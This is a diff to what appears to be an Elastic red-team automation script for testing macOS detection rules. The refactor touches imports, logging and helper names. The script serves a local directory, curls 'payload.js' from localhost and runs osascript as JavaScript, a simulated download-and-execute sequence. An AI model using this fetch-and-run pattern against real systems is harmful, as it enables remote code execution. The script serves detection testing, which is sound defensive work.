@@ -3,9 +3,12 @@
 # 2.0; you may not use this file except in compliance with the Elastic License
 # 2.0.
 
-from . import _common, RuleMetadata, register_code_rta, OSType
-
+import logging
 from time import sleep
+
+from . import OSType, RuleMetadata, _common, register_code_rta
+
+log = logging.getLogger(__name__)
 
 
 @register_code_rta(
@@ -20,9 +23,9 @@ from time import sleep
 )
 def main():
     # Setup web server
-    _common.serve_web()
+    _ = _common.serve_dir_over_http()
 
-    _common.log("Executing commands to download and execute JavaScript payload")
-    _common.execute(["curl", "http://127.0.0.1:8000/payload.js"], shell=True)
+    log.info("Executing commands to download and execute JavaScript payload")
+    _ = _common.execute_command(["curl", "http://127.0.0.1:8000/payload.js"], shell=True)
     sleep(1)
-    _common.execute(["osascript", "-l", "JavaScript", "&"], shell=True)
+    _ = _common.execute_command(["osascript", "-l", "JavaScript", "&"], shell=True)
